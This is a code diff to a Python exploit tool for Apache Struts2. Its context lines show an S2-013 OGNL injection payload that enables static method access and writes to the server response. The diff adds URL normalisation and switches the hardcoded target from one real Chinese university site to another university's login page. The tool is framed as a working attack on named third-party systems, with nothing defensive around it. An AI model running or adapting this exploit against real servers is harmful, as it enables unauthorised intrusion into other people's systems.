@@ -12,6 +12,12 @@ class Struts2:
         self.urls = urls
         self.url = ''
 
+    def init(self):
+        if not self.url.startswith('http://') and not self.url.startswith('https://'):
+            self.url = 'http://' + self.url
+        if not self.url.endswith('/'):
+            self.url += '/'
+
     def struts2_013(self):
         exp = '''?a=${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext
         @getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('webpath
@@ -116,9 +122,10 @@ class Struts2:
         if self.urls:
             for url in self.urls:
                 self.url = url
+                self.init()
                 self.struts2()
 
 
 if __name__ == '__main__':
-    Struts2(['http://e.njutcm.edu.cn/thesis/index.do']).run()
+    Struts2(['http://jwgl.njnu.edu.cn/cas/login.action']).run()
 
